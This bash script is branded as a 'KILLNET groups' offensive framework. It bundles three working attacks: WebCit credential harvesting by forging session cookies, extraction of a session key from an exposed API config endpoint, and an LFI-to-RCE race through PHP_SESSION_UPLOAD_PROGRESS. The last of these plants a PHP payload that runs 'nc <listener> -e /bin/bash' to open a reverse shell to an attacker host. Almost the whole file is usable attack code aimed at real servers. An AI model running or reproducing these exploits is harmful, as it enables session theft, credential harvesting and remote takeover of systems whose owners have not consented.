#!/usr/bin/env bash
#
# =============================================================================
#   ██╗  ██╗██╗██╗     ██╗     ███╗   ██╗███████╗████████╗
#   ██║ ██╔╝██║██║     ██║     ████╗  ██║██╔════╝╚══██╔══╝
#   █████╔╝ ██║██║     ██║     ██╔██╗ ██║█████╗     ██║
#   ██╔═██╗ ██║██║     ██║     ██║╚██╗██║██╔══╝     ██║
#   ██║  ██╗██║███████╗███████╗██║ ╚████║███████╗   ██║
#   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝
#
#                          KILLNET groups
# =============================================================================
#
#                                REDFOX
#
# =============================================================================
#
# Multi-mode offensive security framework.
#
# -----------------------------------------------------------------------------
# Modules included:
#
#   1) WebCit <= 926 Session Hijacking
#   2) API Config Extraction (TLS 1.2, no cert/hostname verification)
#   3) PHP_SESSION_UPLOAD_PROGRESS Abuse (LFI -> RCE race)
#
# -----------------------------------------------------------------------------
# Background Notes:
#
# BOLA (Broken Object Level Authorization):
#   In a BOLA attack, a user logs into an API legitimately but then alters a
#   variable—like an account ID, invoice number, or user string—in the API
#   request. Because the server validates who you are (authentication) but
#   fails to check what you are allowed to see.
#
# Response Leakage:
#   Attackers can intercept the raw JSON response to read hidden fields like
#   plaintext passwords, emails, or encryption keys.
#
# =============================================================================
#

URL=""
VERBOSE=0
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"

banner() {
    echo "██╗  ██╗██╗██╗     ██╗     ███╗   ██╗███████╗████████╗"
    echo "██║ ██╔╝██║██║     ██║     ████╗  ██║██╔════╝╚══██╔══╝"
    echo "█████╔╝ ██║██║     ██║     ██╔██╗ ██║█████╗     ██║   "
    echo "██╔═██╗ ██║██║     ██║     ██║╚██╗██║██╔══╝     ██║   "
    echo "██║  ██╗██║███████╗███████╗██║ ╚████║███████╗   ██║   "
    echo "╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   "
    echo "                    KILLNET groups"
    echo ""
    echo "                         REDFOX"
    echo ""
}

usage() {
    banner
    echo "Usage: $0 <mode> [options]"
    echo ""
    echo "Modes:"
    echo "  --url <URL> [--verbose]"
    echo "      WebCit <= 926 session hijacking."
    echo ""
    echo "  --api-config"
    echo "      Extract API config (sessionKey, serverVersion, productName,"
    echo "      productVariant, displayName) from https://<ip>:8443/api/config"
    echo ""
    echo "  --php-session <TargetURL> <ListnerIP> <ListnerPORT>"
    echo "      Abuse PHP_SESSION_UPLOAD_PROGRESS (LFI -> RCE race)."
    echo ""
    echo "Options:"
    echo "  --verbose, -v    Show extra debug output."
    echo "  -h, --help       Show this help."
    exit 1
}

API_CONFIG_MODE=0
PHP_SESSION_MODE=0
PHP_TARGET=""
PHP_LISTENER_IP=""
PHP_LISTENER_PORT=""

# ----- Argument parsing -------------------------------------------------------
while [[ $# -gt 0 ]]; do
    case "$1" in
        --url)
            URL="$2"
            shift 2
            ;;
        --verbose|-v)
            VERBOSE=1
            shift
            ;;
        --api-config)
            API_CONFIG_MODE=1
            shift
            ;;
        --php-session)
            PHP_SESSION_MODE=1
            PHP_TARGET="$2"
            PHP_LISTENER_IP="$3"
            PHP_LISTENER_PORT="$4"
            shift 4
            ;;
        -h|--help)
            usage
            ;;
        *)
            echo "Unknown option: $1"
            usage
            ;;
    esac
done

# =============================================================================
# MODULE 1: WebCit <= 926 Session Hijacking
# =============================================================================
check_endpoint() {
    local http_code
    http_code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -A "$UA" \
        "$URL/dotskip?room=_BASEROOM_")

    if [[ "$http_code" == "200" ]]; then
        echo "[+] WebCit is reachable"
        echo ""
    else
        echo ""
        echo "[-] WebCit response code: $http_code"
        exit 1
    fi
}

harvesting() {
    local epoch_time search_back_in
    local payload payload_hex
    local response cookie_hex cookievalue
    local p1 p2

    epoch_time=$(date +%s)

    # Harvesting technique only searches for users that logged-in within
    # the last ~20 minutes. Increase search_back_in to go further back
    # (requires more time and requests). Make sure the timezone matches
    # the server's timezone.
    search_back_in=999

    echo "[/] Credential harvesting in progress..."

    while [[ "$search_back_in" -gt 0 ]]; do
        payload="$(($epoch_time - $search_back_in))|||||"
        payload_hex=$(printf '%s' "$payload" | xxd -p | tr -d '\n')

        response=$(curl -sk -i \
            -A "$UA" \
            -H "Cookie: webcit=$payload_hex" \
            "$URL/dotskip?room=_BASEROOM_")

        cookie_hex=$(printf '%s\n' "$response" \
            | grep -i '^set-cookie:' \
            | sed -n 's/.*webcit=\([0-9a-fA-F]*\).*/\1/p' \
            | head -n1)

        if [[ -n "$cookie_hex" ]]; then
            cookievalue=$(printf '%s' "$cookie_hex" | xxd -r -p 2>/dev/null)

            if [[ -n "$cookievalue" ]]; then
                p1=$(printf '%s' "$cookievalue" | cut -d'|' -f2)
                p2=$(printf '%s' "$cookievalue" | cut -d'|' -f3)

                if [[ -n "$p1" && -n "$p2" ]]; then
                    echo "Credential found: $cookievalue"
                fi
            else
                [[ "$VERBOSE" -eq 1 ]] && \
                    echo "[-] Invalid returned cookie value not valid, skipping"
            fi
        else
            [[ "$VERBOSE" -eq 1 ]] && \
                echo "[-] Invalid returned cookie value not valid, skipping"
        fi

        search_back_in=$((search_back_in - 1))
    done

    echo "[+] Credential harvesting done."
}

# =============================================================================
# MODULE 2: API Config Extraction
#
# Forces TLSv1.2, disables hostname check and certificate validation, then
# requests https://<ip>:8443/api/config and extracts key fields from JSON.
# =============================================================================
api_config_extract() {
    local ip_address
    local url
    local response
    local http_code
    local body

    read -r -p "Please enter the IP address: " ip_address
    if [[ -z "$ip_address" ]]; then
        echo "[-] No IP address provided."
        return 1
    fi

    url="https://${ip_address}:8443/api/config"

    response=$(curl -sk \
        --tlsv1.2 --tls-max 1.2 \
        -A "$UA" \
        -w "\n%{http_code}" \
        "$url" 2>/dev/null)

    http_code=$(printf '%s\n' "$response" | tail -n1)
    body=$(printf '%s\n' "$response" | sed '$d')

    if [[ "$http_code" != "200" ]]; then
        echo "[-] Failed to retrieve data. HTTP Status code: $http_code"
        [[ "$VERBOSE" -eq 1 ]] && printf '%s\n' "$body"
        return 1
    fi

    if command -v python3 >/dev/null 2>&1; then
        printf '%s' "$body" | python3 -c '
import sys, json
try:
    data = json.load(sys.stdin)
except Exception as e:
    print(f"[-] Failed to parse JSON: {e}")
    sys.exit(1)

session_key      = (data.get("m_authenticationCuration") or {}).get("sessionKey")
server_version   = data.get("m_serverVersion")
product_name     = data.get("m_productName")
product_variant  = data.get("m_productVariant")
display_name     = (data.get("m_displayInformation") or {}).get("m_displayName")

def show(label, val):
    if val:
        print(f"{label}: {val}")
    else:
        print(f"{label} not found in the response.")

show("Session Key",   session_key)
show("Server Version", server_version)
show("Product Name",  product_name)
show("Product Variant", product_variant)
show("Display Name",  display_name)
'
    else
        echo "[!] python3 not found, falling back to grep/sed parsing"
        local sk sv pn pv dn
        sk=$(printf '%s' "$body" | grep -o '"sessionKey"[[:space:]]*:[[:space:]]*"[^"]*"' | head -n1 | sed 's/.*:[[:space:]]*"//;s/"$//')
        sv=$(printf '%s' "$body" | grep -o '"m_serverVersion"[[:space:]]*:[[:space:]]*"[^"]*"' | head -n1 | sed 's/.*:[[:space:]]*"//;s/"$//')
        pn=$(printf '%s' "$body" | grep -o '"m_productName"[[:space:]]*:[[:space:]]*"[^"]*"' | head -n1 | sed 's/.*:[[:space:]]*"//;s/"$//')
        pv=$(printf '%s' "$body" | grep -o '"m_productVariant"[[:space:]]*:[[:space:]]*"[^"]*"' | head -n1 | sed 's/.*:[[:space:]]*"//;s/"$//')
        dn=$(printf '%s' "$body" | grep -o '"m_displayName"[[:space:]]*:[[:space:]]*"[^"]*"' | head -n1 | sed 's/.*:[[:space:]]*"//;s/"$//')

        [[ -n "$sk" ]] && echo "Session Key: $sk"          || echo "sessionKey not found in the response."
        [[ -n "$sv" ]] && echo "Server Version: $sv"       || echo "serverVersion not found in the response."
        [[ -n "$pn" ]] && echo "Product Name: $pn"         || echo "productName not found in the response."
        [[ -n "$pv" ]] && echo "Product Variant: $pv"      || echo "productVariant not found in the response."
        [[ -n "$dn" ]] && echo "Display Name: $dn"         || echo "displayName not found in the response."
    fi
}

# =============================================================================
# MODULE 3: PHP_SESSION_UPLOAD_PROGRESS Abuse
#
# Races an LFI against a PHP session upload progress file. Many workers spam
# POST requests that upload a PHP payload via the PHP_SESSION_UPLOAD_PROGRESS
# form field while simultaneously triggering the LFI (param `lfi`) to include
# /var/lib/php/sessions/sess_<sessionName>. If a request wins the race, the
# remote host executes `nc <listenerIP> <listenerPORT> -e /bin/bash`.
#
# NOTE: The vulnerable parameter is `lfi` in this PoC. Change it to match
# your target's actual parameter name.
# =============================================================================
php_session_attack() {
    local target="$1"
    local listener_ip="$2"
    local listener_port="$3"

    local duration=10
    local workers=20
    local session_name="SiLvER"

    local end_time=$(( $(date +%s) + duration ))

    local php_payload='<?php `nc '"$listener_ip"' '"$listener_port"' -e /bin/bash`;?>'

    local tmpfile
    tmpfile=$(mktemp)
    # shellcheck disable=SC2046
    printf 'Abusing PHP_SESSION_UPLOAD_PROGRESS By Faisal Alhadlaq %.0s' $(seq 1 100) > "$tmpfile"

    cleanup_php_session() {
        rm -f "$tmpfile"
    }
    trap cleanup_php_session EXIT

    echo ""
    echo "(+) PoC for Abusing PHP_SESSION_UPLOAD_PROGRESS By SiLvER"
    echo ""
    echo "[*] Target       : $target"
    echo "[*] Listener     : $listener_ip:$listener_port"
    echo "[*] Session Name : $session_name"
    echo "[*] Workers      : $workers"
    echo "[*] Duration     : ${duration}s"
    echo "[*] LFI param    : lfi=/var/lib/php/sessions/sess_${session_name}"
    echo ""
    echo "[*] Make sure your listener is running:  nc -lvnp $listener_port"
    echo ""

    local pids=()
    local i

    for ((i=0; i<workers; i++)); do
        (
            while [[ $(date +%s) -lt $end_time ]]; do
                curl -sk -o /dev/null \
                    -A "$UA" \
                    -H "Cookie: PHPSESSID=${session_name}" \
                    -F "PHP_SESSION_UPLOAD_PROGRESS=${php_payload}" \
                    -F "file=@${tmpfile};filename=anyThinG;type=application/octet-stream" \
                    "${target}?lfi=/var/lib/php/sessions/sess_${session_name}" \
                    >/dev/null 2>&1
            done
        ) &
        pids+=($!)
    done

    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null
    done

    echo ""
    echo "[+] Attack window closed. Check your listener for a shell."
}

# =============================================================================
# Dispatch
# =============================================================================
if [[ "$API_CONFIG_MODE" -eq 1 ]]; then
    banner
    api_config_extract
    exit $?
fi

if [[ "$PHP_SESSION_MODE" -eq 1 ]]; then
    banner
    if [[ -z "$PHP_TARGET" || -z "$PHP_LISTENER_IP" || -z "$PHP_LISTENER_PORT" ]]; then
        echo "(-) Usage: $0 --php-session <TargetURL> <ListnerIP> <ListnerPORT>"
        echo "(-) eg:    $0 --php-session http://target/vuln.php 10.10.14.5 4444"
        exit 1
    fi
    php_session_attack "$PHP_TARGET" "$PHP_LISTENER_IP" "$PHP_LISTENER_PORT"
    exit $?
fi

if [[ -z "$URL" ]]; then
    usage
fi

banner
check_endpoint
harvesting